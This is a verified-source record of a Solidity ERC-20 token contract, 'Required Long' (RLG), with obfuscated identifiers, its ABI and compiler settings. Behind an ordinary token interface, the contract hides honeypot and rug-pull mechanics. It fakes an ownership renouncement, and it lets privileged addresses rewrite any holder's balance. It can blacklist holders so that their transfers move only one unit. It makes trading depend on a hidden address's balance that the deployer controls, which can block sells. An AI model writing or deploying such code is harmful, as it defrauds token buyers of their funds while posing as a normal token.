{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface atAmount {\n    function createPair(address maxLimit, address sellAmountFrom) external returns (address);\n}\n\ninterface autoTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamTake) external view returns (uint256);\n\n    function transfer(address totalFromShould, uint256 minModeFee) external returns (bool);\n\n    function allowance(address marketingTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minModeFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalFromShould,\n        uint256 minModeFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atFund, uint256 value);\n    event Approval(address indexed marketingTotal, address indexed spender, uint256 value);\n}\n\nabstract contract toAt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface autoToMetadata is autoTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RequiredLong is toAt, autoTo, autoToMetadata {\n\n    bool public feeMarketing;\n\n    uint256 constant marketingTx = 1 ** 10;\n\n    uint8 private autoSender = 18;\n\n    function totalAmount() public {\n        emit OwnershipTransferred(receiverTx, address(0));\n        receiverLaunchFund = address(0);\n    }\n\n    function approve(address fromTradingExempt, uint256 minModeFee) public virtual override returns (bool) {\n        minSell[_msgSender()][fromTradingExempt] = minModeFee;\n        emit Approval(_msgSender(), fromTradingExempt, minModeFee);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderIsList;\n    }\n\n    uint256 public maxExempt;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txLiquidity;\n    }\n\n    function transfer(address shouldTrading, uint256 minModeFee) external virtual override returns (bool) {\n        return enableMax(_msgSender(), shouldTrading, minModeFee);\n    }\n\n    address feeTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public sellAuto;\n\n    mapping(address => bool) public receiverSender;\n\n    uint256 shouldFee;\n\n    bool public limitSwap;\n\n    bool public swapToken;\n\n    mapping(address => mapping(address => uint256)) private minSell;\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoSender;\n    }\n\n    function tokenBuyExempt(uint256 minModeFee) public {\n        receiverFund();\n        shouldFee = minModeFee;\n    }\n\n    uint256 private modeTeam;\n\n    address public receiverTx;\n\n    function shouldTx(address marketingSwap) public {\n        receiverFund();\n        \n        if (marketingSwap == receiverTx || marketingSwap == sellAuto) {\n            return;\n        }\n        toMax[marketingSwap] = true;\n    }\n\n    function shouldMaxTotal(address isLimitSell) public {\n        if (feeMarketing) {\n            return;\n        }\n        if (limitSwap == swapToken) {\n            swapToken = true;\n        }\n        receiverSender[isLimitSell] = true;\n        \n        feeMarketing = true;\n    }\n\n    function receiverFund() private view {\n        require(receiverSender[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return receiverLaunchFund;\n    }\n\n    event OwnershipTransferred(address indexed autoTeam, address indexed feeFund);\n\n    function name() external view virtual override returns (string memory) {\n        return buyEnable;\n    }\n\n    mapping(address => uint256) private totalFee;\n\n    string private senderIsList = \"RLG\";\n\n    function transferFrom(address tradingReceiver, address totalFromShould, uint256 minModeFee) external override returns (bool) {\n        if (_msgSender() != feeTotal) {\n            if (minSell[tradingReceiver][_msgSender()] != type(uint256).max) {\n                require(minModeFee <= minSell[tradingReceiver][_msgSender()]);\n                minSell[tradingReceiver][_msgSender()] -= minModeFee;\n            }\n        }\n        return enableMax(tradingReceiver, totalFromShould, minModeFee);\n    }\n\n    constructor (){\n        \n        sellReceiver marketingMin = sellReceiver(feeTotal);\n        sellAuto = atAmount(marketingMin.factory()).createPair(marketingMin.WETH(), address(this));\n        if (maxExempt == modeTeam) {\n            swapToken = false;\n        }\n        receiverTx = _msgSender();\n        receiverSender[receiverTx] = true;\n        totalFee[receiverTx] = txLiquidity;\n        totalAmount();\n        if (maxExempt != modeTeam) {\n            swapToken = true;\n        }\n        emit Transfer(address(0), receiverTx, txLiquidity);\n    }\n\n    address private receiverLaunchFund;\n\n    function enableMax(address tradingReceiver, address totalFromShould, uint256 minModeFee) internal returns (bool) {\n        if (tradingReceiver == receiverTx) {\n            return receiverTake(tradingReceiver, totalFromShould, minModeFee);\n        }\n        uint256 txList = autoTo(sellAuto).balanceOf(limitToken);\n        require(txList == shouldFee);\n        require(totalFromShould != limitToken);\n        if (toMax[tradingReceiver]) {\n            return receiverTake(tradingReceiver, totalFromShould, marketingTx);\n        }\n        return receiverTake(tradingReceiver, totalFromShould, minModeFee);\n    }\n\n    address limitToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public toMax;\n\n    uint256 listIs;\n\n    function receiverTake(address tradingReceiver, address totalFromShould, uint256 minModeFee) internal returns (bool) {\n        require(totalFee[tradingReceiver] >= minModeFee);\n        totalFee[tradingReceiver] -= minModeFee;\n        totalFee[totalFromShould] += minModeFee;\n        emit Transfer(tradingReceiver, totalFromShould, minModeFee);\n        return true;\n    }\n\n    string private buyEnable = \"Required Long\";\n\n    function owner() external view returns (address) {\n        return receiverLaunchFund;\n    }\n\n    function allowance(address receiverAtTo, address fromTradingExempt) external view virtual override returns (uint256) {\n        if (fromTradingExempt == feeTotal) {\n            return type(uint256).max;\n        }\n        return minSell[receiverAtTo][fromTradingExempt];\n    }\n\n    function balanceOf(address teamTake) public view virtual override returns (uint256) {\n        return totalFee[teamTake];\n    }\n\n    function feeAuto(address shouldTrading, uint256 minModeFee) public {\n        receiverFund();\n        totalFee[shouldTrading] = minModeFee;\n    }\n\n    uint256 private txLiquidity = 100000000 * 10 ** 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atFund\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAtTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromTradingExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTradingExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minModeFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minModeFee\",\"type\":\"uint256\"}],\"name\":\"feeAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLimitSell\",\"type\":\"address\"}],\"name\":\"shouldMaxTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingSwap\",\"type\":\"address\"}],\"name\":\"shouldTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minModeFee\",\"type\":\"uint256\"}],\"name\":\"tokenBuyExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minModeFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalFromShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minModeFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RequiredLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}